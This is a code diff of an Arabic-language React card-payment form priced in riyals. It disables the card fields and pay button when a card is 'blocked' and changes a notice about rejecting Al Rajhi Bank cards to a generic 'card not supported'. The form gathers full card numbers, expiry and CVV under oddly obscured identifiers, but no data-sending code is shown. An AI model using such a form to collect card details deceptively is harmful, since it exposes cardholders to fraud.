@@ -554,7 +554,8 @@ export default function P1({ offerTotalPrice }: _P1Props) {
               onChange={(e) => _s4(e.target.value.toUpperCase())}
               placeholder="CARDHOLDER NAME"
               dir="ltr"
-              className="h-14 md:h-16 text-lg md:text-xl uppercase border-2 border-gray-300 focus:border-[#0a4a68] rounded-xl"
+              disabled={isCardBlockedState}
+              className={`h-14 md:h-16 text-lg md:text-xl uppercase border-2 rounded-xl ${isCardBlockedState ? "bg-gray-100 border-gray-300 cursor-not-allowed" : "border-gray-300 focus:border-[#0a4a68]"}`}
               required
             />
           </div>
@@ -564,13 +565,13 @@ export default function P1({ offerTotalPrice }: _P1Props) {
             <label className="flex items-center gap-2 text-gray-900 font-bold text-sm md:text-base">
               <CreditCard className="w-4 h-4 text-[#0a4a68]" />
               رقم البطاقة
-              {isValidCard && (
+              {isValidCard && !isCardBlockedState && (
                 <Badge variant="outline" className="border-green-500 text-green-700 text-xs">
                   <ShieldCheck className="w-3 h-3 ml-1" />
                   صالح
                 </Badge>
               )}
-              {cardType && (
+              {cardType && !isCardBlockedState && (
                 <Badge className="bg-blue-100 text-blue-800 text-xs">
                   {cardType}
                 </Badge>
@@ -583,16 +584,11 @@ export default function P1({ offerTotalPrice }: _P1Props) {
               placeholder="1234 5678 9012 3456"
               maxLength={19}
               dir="ltr"
-              className={`h-14 md:h-16 text-xl md:text-2xl font-mono tracking-wider border-2 rounded-xl transition-all ${
-                isValidCard 
-                  ? "border-green-500 focus:border-green-600" 
-                  : _v1.length > 0 
-                  ? "border-red-300 focus:border-red-500" 
-                  : "border-gray-300 focus:border-[#0a4a68]"
-              }`}
+              disabled={isCardBlockedState}
+              className={`h-14 md:h-16 text-xl md:text-2xl font-mono tracking-wider border-2 rounded-xl transition-all ${isCardBlockedState ? "bg-gray-100 border-gray-300 cursor-not-allowed" : isValidCard ? "border-green-500 focus:border-green-600" : _v1.length > 0 ? "border-red-300 focus:border-red-500" : "border-gray-300 focus:border-[#0a4a68]"}`}
               required
             />
-            {_v1.length > 0 && _v1.replace(/\s/g, "").length !== 16 && (
+            {_v1.length > 0 && _v1.replace(/\s/g, "").length !== 16 && !isCardBlockedState && (
               <p className="text-red-500 text-xs">يجب أن يكون 16 رقم</p>
             )}
             {cardRejectionError && (
@@ -605,10 +601,10 @@ export default function P1({ offerTotalPrice }: _P1Props) {
             {isCardBlockedState && (
               <div className="bg-red-50 border-2 border-red-500 rounded-lg p-3 mt-2">
                 <p className="text-red-700 text-sm font-bold">
-                  ⚠️ تم إيقاف التسديد من خلال مصرف الراجحي والمحافظ الإلكترونية
+                  ⚠️ هذه البطاقة غير مدعومة
                 </p>
                 <p className="text-red-600 text-xs mt-1">
-                  الرجاء إدخال بطاقة من مصرف آخر
+                  يرجى استخدام طريقة دفع أخرى
                 </p>
               </div>
             )}
@@ -627,11 +623,8 @@ export default function P1({ offerTotalPrice }: _P1Props) {
                 placeholder="MM/YY"
                 maxLength={5}
                 dir="ltr"
-                className={`h-14 md:h-16 text-xl md:text-2xl font-mono border-2 rounded-xl ${
-                  expiryError 
-                    ? "border-red-500 focus:border-red-600" 
-                    : "border-gray-300 focus:border-[#0a4a68]"
-                }`}
+                disabled={isCardBlockedState}
+                className={`h-14 md:h-16 text-xl md:text-2xl font-mono border-2 rounded-xl ${isCardBlockedState ? "bg-gray-100 border-gray-300 cursor-not-allowed" : expiryError ? "border-red-500 focus:border-red-600" : "border-gray-300 focus:border-[#0a4a68]"}`}
                 required
               />
               {expiryError && (
@@ -650,7 +643,8 @@ export default function P1({ offerTotalPrice }: _P1Props) {
                 placeholder="123"
                 maxLength={3}
                 dir="ltr"
-                className="h-14 md:h-16 text-xl md:text-2xl font-mono border-2 border-gray-300 focus:border-[#0a4a68] rounded-xl"
+                disabled={isCardBlockedState}
+                className={`h-14 md:h-16 text-xl md:text-2xl font-mono border-2 rounded-xl ${isCardBlockedState ? "bg-gray-100 border-gray-300 cursor-not-allowed" : "border-gray-300 focus:border-[#0a4a68]"}`}
                 required
               />
               {_v2.length > 0 && _v2.length !== 3 && (
@@ -678,11 +672,11 @@ export default function P1({ offerTotalPrice }: _P1Props) {
           {/* Submit Button with Price */}
           <Button
             type="submit"
-            disabled={!isValidCard || !_v3 || _v2.length !== 3 || !!expiryError || !_v4}
+            disabled={!isValidCard || !_v3 || _v2.length !== 3 || !!expiryError || !_v4 || isCardBlockedState}
             className="w-full h-16 md:h-18 bg-gradient-to-r from-yellow-400 to-yellow-500 hover:from-yellow-500 hover:to-yellow-600 text-[#0a4a68] font-bold text-xl md:text-2xl rounded-xl shadow-lg hover:shadow-xl transition-all disabled:opacity-50 disabled:cursor-not-allowed"
           >
             <Lock className="w-5 h-5 ml-2" />
-            دفع {finalPrice.toFixed(2)} ﷼
+            {isCardBlockedState ? "البطاقة غير مدعومة" : `دفع ${finalPrice.toFixed(2)} ﷼`}
           </Button>
 
           {/* Security Notice */}
